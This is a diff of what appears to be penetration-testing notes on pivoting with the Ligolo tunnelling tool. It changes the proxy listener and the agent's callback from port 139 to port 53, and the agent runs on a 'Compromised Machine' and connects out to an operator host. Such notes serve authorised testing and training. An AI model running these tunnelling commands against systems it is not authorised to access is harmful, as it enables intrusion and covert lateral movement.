@@ -75,13 +75,13 @@ ip link delete ligolo-double
 Create Interface
 
 ```
-sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:139
+sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:53
 ```
 
 Run Ligolo Agent on Compromised Machine
 
 ```
-./agent -connect 10.10.10.10:139 -ignore-cert
+./agent -connect 10.10.10.10:53 -ignore-cert
 ```
 
 Create Tunnel on Ligolo
